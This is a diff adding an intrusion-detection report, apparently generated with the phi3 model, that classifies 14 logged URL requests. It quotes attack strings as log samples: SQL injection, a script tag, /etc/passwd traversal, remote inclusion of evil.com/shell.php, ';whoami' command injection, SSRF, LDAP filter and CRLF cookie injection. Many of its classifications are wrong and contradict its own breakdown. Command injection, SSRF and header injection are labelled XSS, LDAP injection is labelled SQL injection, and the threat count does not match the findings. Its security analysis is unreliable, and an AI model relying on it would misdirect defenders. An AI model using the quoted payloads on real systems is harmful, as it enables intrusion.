@@ -1,0 +1,130 @@
+═══════════════════════════════════════════════════════════════
+          HIDS - URL-Based Attack Detection Report
+              Powered by Ollama Phi3 AI Model
+═══════════════════════════════════════════════════════════════
+
+Analysis Date:        8/4/2026, 4:49:35 pm
+File Type:            CSV
+Total Entries (Modules): 14
+Threats Detected (Modules): 9 (64.3%)
+Ollama Enriched Entries: 14
+AI Model Used: phi3
+
+───────────────────────────────────────────────────────────────
+  CLASSIFICATION BREAKDOWN
+───────────────────────────────────────────────────────────────
+  Normal                    5 entries
+  Local File Inclusion (LFI) 2 entries
+  SQL Injection             1 entries
+  Cross-Site Scripting (XSS) 1 entries
+  Remote File Inclusion (RFI) 1 entries
+  Command Injection         1 entries
+  Server-Side Request Forgery (SSRF) 1 entries
+  LDAP Injection            1 entries
+  HTTP Header Injection     1 entries
+
+───────────────────────────────────────────────────────────────
+  DETAILED FINDINGS
+───────────────────────────────────────────────────────────────
+
+  [1] /login?id=1 OR 1=1--
+      Source IP:       192.168.1.10
+      Classification:  SQL Injection
+      Risk Level:      Critical
+      Patterns:        The URL parameter 'id' is used in a way that suggests an SQL injection attempt.
+      Recommendation:  Immediately sanitize and validate all user inputs, implement prepared statements for database access.
+
+  [2] /search?q=<script>alert(1)</script>
+      Source IP:       192.168.1.11
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      High
+      Patterns:        <script>alert(1)</script>
+      Recommendation:  Implement Content Security Policy and input validation
+
+  [3] /download?file=../../etc/passwd
+      Source IP:       192.168.1.12
+      Classification:  Directory Traversal
+      Risk Level:      Critical
+      Patterns:        The URL parameter 'file' is used to access sensitive files outside the web root.
+      Recommendation:  Implement strict input validation and sanitization, restrict file system access based on user privileges.
+
+  [4] /index.php?page=../../etc/passwd
+      Source IP:       192.168.1.13
+      Classification:  Directory Traversal
+      Risk Level:      Critical
+      Patterns:        Path traversal attempt to access sensitive files outside the web root.
+      Recommendation:  Implement strict input validation and use allowlists for file paths.
+
+  [5] /index.php?page=http://evil.com/shell.php
+      Source IP:       192.168.1.14
+      Classification:  Remote File Inclusion (RFI)
+      Risk Level:      Critical
+      Patterns:        Attempt to include a malicious script from an external site.
+      Recommendation:  Immediately block the source IP and investigate for potential breaches.
+
+  [6] /ping?ip=127.0.0.1;whoami
+      Source IP:       192.168.1.15
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        The URL parameter 'ip' is used in a way that suggests an attempt to execute system commands on the server.
+      Recommendation:  Implement strict input validation and sanitization, disable direct execution of shell commands.
+
+  [7] /fetch?url=http://127.0.0.1/admin
+      Source IP:       192.168.1.16
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      High
+      Patterns:        The URL parameter 'url' is used to fetch content from a different domain, which could be an attempt at XSS if not properly sanitized.
+      Recommendation:  Implement strict input validation and output encoding mechanisms.
+
+  [8] /xml
+      Source IP:       192.168.1.17
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        POST request to /xml endpoint without proper input sanitization, potential for script injection.
+      Recommendation:  Implement strict content security policies and validate/sanitize all inputs.
+
+  [9] /login?user=*)(|(user=*))
+      Source IP:       192.168.1.18
+      Classification:  SQL Injection
+      Risk Level:      Critical
+      Patterns:        The URL contains SQL injection payloads that attempt to manipulate the login query.
+      Recommendation:  Immediately sanitize and validate all user inputs, implement prepared statements or stored procedures for database access.
+
+  [10] /page?name=abc%0d%0aSet-Cookie:malicious=true
+      Source IP:       192.168.1.19
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        URL contains a newline character followed by an attempt to set a malicious cookie.
+      Recommendation:  Implement strict Content Security Policy and validate all user inputs.
+
+  [11] /login
+      Source IP:       192.168.1.20
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        User input is not properly sanitized, allowing scripts to be injected.
+      Recommendation:  Implement strict content security policies and validate/sanitize all user inputs.
+
+  [12] /transfer
+      Source IP:       192.168.1.21
+      Classification:  Cross-Site Scripting (XSS)
+      Risk Level:      Medium
+      Patterns:        User input is not properly sanitized, allowing scripts to be injected.
+      Recommendation:  Implement strict content security policies and validate/sanitize all user inputs.
+
+  [13] /api
+      Source IP:       192.168.1.22
+      Classification:  None
+      Risk Level:      Low
+      Patterns:        None
+      Recommendation:  No immediate action required. Monitor for changes.
+
+  [14] /home
+      Source IP:       192.168.1.23
+      Classification:  None
+      Risk Level:      Low
+      Patterns:        None
+      Recommendation:  No immediate action required. Monitor for unusual activity.
+
+═══════════════════════════════════════════════════════════════
+  End of Report — Generated by HIDS Dashboard
+═══════════════════════════════════════════════════════════════
